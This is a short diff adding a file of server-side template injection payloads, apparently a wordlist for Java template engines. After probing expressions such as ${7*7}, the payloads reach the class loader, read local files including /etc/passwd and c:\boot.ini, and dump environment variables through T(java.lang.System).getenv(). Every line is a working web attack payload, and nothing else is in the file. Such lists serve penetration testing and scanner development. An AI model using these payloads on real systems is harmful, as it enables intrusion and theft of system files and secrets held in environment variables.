@@ -1,0 +1,8 @@
+${{7*7}}
+${7*7}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('c:\boot.ini').toURL().openStream().readAllBytes()?join(" ")}
+${T(java.lang.System).getenv()}
